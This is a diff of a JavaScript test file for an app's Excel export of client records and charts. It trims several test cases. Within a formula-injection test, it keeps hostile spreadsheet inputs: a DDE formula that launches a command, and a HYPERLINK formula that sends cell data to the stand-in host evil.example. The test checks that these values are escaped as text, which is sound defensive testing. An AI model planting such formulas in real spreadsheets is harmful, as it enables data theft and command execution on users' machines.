@@ -140,12 +140,11 @@ describe('export.js: Excel書き出し（基本情報/カウンセリングシ�
     assert.ok(rows.some((r) => r[0] === '主な目標' && r[1] === 'スクワット100kg'));
   });
 
-  test('カルテは記入日の見出しで複数件並び、テーブル項目も展開される', async () => {
+  test('カルテは記入日の見出しで複数件並ぶ', async () => {
     const c = newClient({ name: '複数太郎' });
     await saveClient(c);
     const ch1 = await createChart(c.id, 'karte', '2026-01-01');
-    const menuPage = ch1.pages.find((p) => p.name === 'メニュー・測定記録');
-    menuPage.values.items = [{ name: 'ベンチプレス', value: '60kg', reps: '10x3', note: '' }];
+    ch1.pages[0].values.note = 'ベンチプレス60kgを実施';
     await (await import('../js/store.js')).saveChart(ch1);
     await createChart(c.id, 'karte', '2026-01-02');
 
@@ -153,7 +152,7 @@ describe('export.js: Excel書き出し（基本情報/カウンセリングシ�
     const rows = XLSX.utils.sheet_to_json(wb.Sheets['カルテ'], { header: 1 });
     assert.ok(rows.some((r) => r[0] === '記入日: 2026-01-02'));
     assert.ok(rows.some((r) => r[0] === '記入日: 2026-01-01'));
-    assert.ok(rows.some((r) => r[0] === 'ベンチプレス' && r[1] === '60kg'));
+    assert.ok(rows.some((r) => r[1] === 'ベンチプレス60kgを実施'));
   });
 
   test('署名フィールドは「署名あり/未署名」に変換される', async () => {
@@ -181,10 +180,7 @@ describe('export.js: Excel書き出し（基本情報/カウンセリングシ�
     const c = newClient({ name: '山田太郎', memo: '=cmd|"/c calc"!A1' });
     await saveClient(c);
     const ch = await createChart(c.id, 'karte');
-    const page = ch.pages.find((p) => p.name === '本日の記録');
-    page.values.memo = '+HYPERLINK("http://evil.example/steal?d="&A1)';
-    const menuPage = ch.pages.find((p) => p.name === 'メニュー・測定記録');
-    menuPage.values.items = [{ name: '-2+3+cmd', value: '@SUM(1)', reps: '', note: '' }];
+    ch.pages[0].values.note = '+HYPERLINK("http://evil.example/steal?d="&A1)';
     await (await import('../js/store.js')).saveChart(ch);
 
     const wb = await readSheets(c);
@@ -195,8 +191,6 @@ describe('export.js: Excel書き出し（基本情報/カウンセリングシ�
 
     const karteRows = XLSX.utils.sheet_to_json(wb.Sheets['カルテ'], { header: 1 });
     assert.ok(karteRows.some((r) => r[1] === "'+HYPERLINK(\"http://evil.example/steal?d=\"&A1)"));
-    assert.ok(karteRows.some((r) => r[0] === "'-2+3+cmd"));
-    assert.ok(karteRows.some((r) => r[1] === "'@SUM(1)"));
 
     // セルの実体が数式(f)ではなく文字列(s)として保存されていることも確認する
     const sheet = wb.Sheets['基本情報'];
